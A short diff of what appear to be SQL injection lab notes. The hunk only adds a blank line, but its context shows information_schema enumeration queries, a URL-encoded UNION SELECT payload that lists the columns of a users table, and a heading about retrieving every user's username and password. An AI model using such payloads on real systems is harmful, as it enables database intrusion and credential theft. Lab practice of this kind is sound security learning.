@@ -9,6 +9,7 @@ SELECT * FROM information_schema.tables
 SELECT * FROM information_schema.columns WHERE table_name = 'Users'
 
 --example--    
+
 '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_cgcmou'--
 
 '--Retrieve usernames and passwords for all users--
